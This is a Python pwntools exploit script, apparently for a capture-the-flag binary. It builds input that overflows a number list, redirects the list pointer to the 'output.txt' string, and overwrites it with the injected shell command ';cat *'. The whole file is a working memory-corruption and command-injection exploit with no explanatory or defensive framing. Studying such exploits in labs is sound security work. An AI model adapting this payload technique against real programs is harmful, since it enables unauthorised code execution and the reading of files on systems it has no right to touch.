#!/usr/bin/python3

from pwn import *

#number of items to originaly allocate
num = 8

#number of items once I have control over the number of items value
changednum = 14

exp = bytes(str(num), "ascii") + b"\n"
exp += b"c\n"

# address of the "output.txt" string
outtxt = 0x404078

for i in range(changednum):
    #random chunk of static writeable memory
    if i == 3:
        out= bytes(str(0x4040c8), "ascii")
        
    # The higher 32 bits is the number of items to write
    elif i == 5:
        out = 0x464646
        out |=  changednum << 32
        out = bytes(str(out), "ascii")
    
    # List pointer
    # Overwrites to point to the "output.txt" string
    # -12 to offset number of items already read
    # *8 due to 8 byte numbers
    elif i == 11:
        out = bytes(str(outtxt - (12*8) ), "ascii")
        
    # Data/cmd to write
    # Note: bytes are reversed
    elif i == 12:
        out = bytes(str(0x20202a207461633b), "ascii")  #;cat *
        
    #Padding for unused/unneeded numbers
    else:
        out = 0
        for _ in range(7):
            out = out << 8
            out += 0x41+i
        out = bytes(str(out), "ascii")
    exp += out + b"\n"

sys.stdout.buffer.write(exp)
